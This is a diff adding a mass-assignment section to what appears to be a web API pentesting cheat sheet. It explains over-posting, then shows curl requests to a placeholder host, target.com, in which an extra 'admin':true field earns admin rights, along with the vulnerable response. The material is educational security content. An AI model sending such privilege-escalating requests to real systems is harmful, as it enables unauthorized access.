@@ -93,6 +93,41 @@ https://target.com/api/v2/users/1 --> 401
 https://target.com/api/v1/users/1 --> 200
 ```
 
+### Mass Assignment
+
+Mass assignment (also known as over-posting) is a web application vulnerability where an attacker can modify properties of an object by submitting additional fields in HTTP requests (typically in JSON or form data) that the developer did not intend to be user-controlled.
+
+Example of normal path:
+```
+curl -X POST https://target.com/api/v1/register -H "Content-Type: application/json" -d '{"username":"pentester", "password":"pentester"}'
+```
+
+API answer:
+```
+{
+    "status": "created",
+    "username": "pentester",
+    "password": "pentester",
+    "admin": false
+}
+```
+
+Mass assignment attack:
+```
+curl -X POST https://target.com/api/v1/register -H "Content-Type: application/json" -d '{"username":"pentester", "password":"pentester", "admin":true}'
+```
+
+Vulnerable API answer:
+```
+{
+    "status": "created",
+    "username": "pentester",
+    "password": "pentester",
+    "admin": true
+}
+```
+
 ## Resources
 
 [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting)
+[OWASP Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
